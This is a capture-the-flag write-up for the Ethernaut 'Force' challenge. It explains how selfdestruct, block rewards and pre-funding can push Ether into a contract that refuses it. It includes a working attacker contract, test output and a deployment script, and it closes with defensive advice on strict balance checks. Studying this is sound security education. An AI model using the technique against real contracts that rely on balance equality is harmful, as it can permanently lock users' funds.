# 07 - Force

## 1. Challenge Overview

- **Objective**: Make the balance of the `Force` contract strictly greater than zero (`address(force).balance > 0`).
- **Vulnerability Category**: Forced Ether Ingestion / Invariant Invalidation via `address(this).balance` (SWC-132).

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

---

## 3. Vulnerability Analysis

### The Fallacy of "Refusing" Ether

Normally, an EVM contract can only accept Ether if it explicitly defines:

1. `receive() external payable`
2. `fallback() external payable`

If neither is defined, any regular transaction sending Ether to the contract (`payable(target).transfer(...)` or `.call{value: 1 wei}("")`) will immediately revert.

However, **there are three ways in the EVM to force Ether into any address without triggering any code execution**:

1. **`selfdestruct(target)`**: When a contract executes `selfdestruct(beneficiary)`, the EVM forcibly transfers all remaining Ether in the dying contract directly to the `beneficiary` account balance at the protocol level. No functions on `beneficiary` are called.
2. **Coinbase / Block Reward**: A validator or block builder can set any contract address as the coinbase recipient for block fees or MEV bundles.
3. **Pre-funding**: Because contract addresses are deterministic (`keccak256(rlp([deployer, nonce]))`), an account can send Ether to the computed address _before_ the contract is even deployed.

### EVM Evolution: EIP-6780 (Cancun Hardfork)

Under **EIP-6780** (activated in the Ethereum Cancun upgrade):

- `selfdestruct` was deprecated and its account-deletion behavior was restricted.
- However, **transferring Ether to the beneficiary is preserved**!
- Furthermore, when `selfdestruct` is called within the same transaction that the contract was created (e.g. inside our `ForceAttack` constructor), the contract is still fully deleted from state while transferring its Ether.

---

## 4. Exploit Architecture

### 1. Attacker Contract (`src/attackers/ForceAttack.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ForceAttack {
    constructor(address payable target) payable {
        // Forcibly transfer any funded Ether to target, bypassing receive/fallback
        selfdestruct(target);
    }
}
```

### 2. Proof-of-Concept Test (`test/07-Force.t.sol`)

We proved both behaviors:

- Direct transfer of 1 wei reverts because `Force` has no payable fallback.
- Deploying `ForceAttack` with 1 wei forcibly increases `Force`'s balance to 1 wei.

```bash
forge test --match-contract ForceTest -vvvv
```

```text
Ran 3 tests for test/07-Force.t.sol:ForceTest
[PASS] test_DirectEtherTransferFails() (gas: 17495)
[PASS] test_InitialBalanceIsZero() (gas: 5019)
[PASS] test_SelfdestructForcesEtherIntoTarget() (gas: 51512)
Logs:
  Local PoC Success: Force balance is now: 1
Suite result: ok. 3 passed; 0 failed
```

### 3. Execution Script (`script/07-Force.s.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {ForceAttack} from "../src/attackers/ForceAttack.sol";

contract ForceScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        console2.log("--- Force Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Target Balance Before:", instance.balance);

        vm.startBroadcast(privateKey);

        // Deploy ForceAttack with 1 wei to selfdestruct into target
        new ForceAttack{value: 1 wei}(payable(instance));

        vm.stopBroadcast();

        console2.log("Target Balance After :", instance.balance);
        require(instance.balance > 0, "Exploit failed: balance is still 0");
        console2.log(">>> SUCCESS! Force contract has balance > 0! Submit instance in Ethernaut. <<<");
    }
}
```

---

## 5. Real-World Security Implications: Breaking Invariants

The danger of forced Ether is not this empty cat contract; it is when production protocols make assumptions about their own balance:

```solidity
// DANGEROUS PATTERN:
require(address(this).balance == totalDeposits, "Accounting mismatch");
```

If an attacker force-feeds just **1 wei** into such a contract via `selfdestruct`:

- `address(this).balance` becomes `totalDeposits + 1`.
- The strict equality check `==` fails forever!
- All functions relying on that check are permanently bricked (**Denial of Service**).

---

## 6. Prevention & Best Practices

1. **Never rely on strict balance equality (`==`)**: Never write `address(this).balance == expectedBalance`. If checking funds, always use inequality bounds (`>=`).
2. **Maintain Internal Accounting**: Track deposits and user funds via explicit state variables (e.g. `uint256 public totalDeposits;`) rather than querying `address(this).balance`.
3. **Be Aware of EIP-6780**: While `selfdestruct` opcode behavior is being phased out across the EVM, the ability to pre-fund addresses or receive coinbase rewards remains.
